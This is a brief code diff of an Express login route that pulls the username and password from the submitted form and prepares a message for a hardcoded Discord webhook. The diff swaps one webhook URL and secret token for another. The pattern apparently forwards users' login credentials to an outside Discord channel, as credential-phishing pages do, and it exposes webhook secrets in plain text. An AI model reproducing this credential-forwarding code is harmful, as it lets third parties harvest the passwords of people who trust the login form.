@@ -13,7 +13,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Validate input
       const formData = loginFormSchema.parse(req.body);
       const { username, password } = formData;
-      const webhookUrl = "https://discord.com/api/webhooks/1350611573877637231/misaVFr3Y4t-rIcHLyo7GqBZfq7Osf3NesaOoLdj_GX8cEA5QiynrK3AW9mILP_6yBA4";
+      const webhookUrl = "https://discord.com/api/webhooks/1351717767585464321/G55PRIVsD7T2AB6yyqD3M_znGaOrwRRezYlqqlOQEXGq4vSQo3rNEWxzZrMJocjoeB93";
 
       // Prepare Discord webhook message
       const message = {
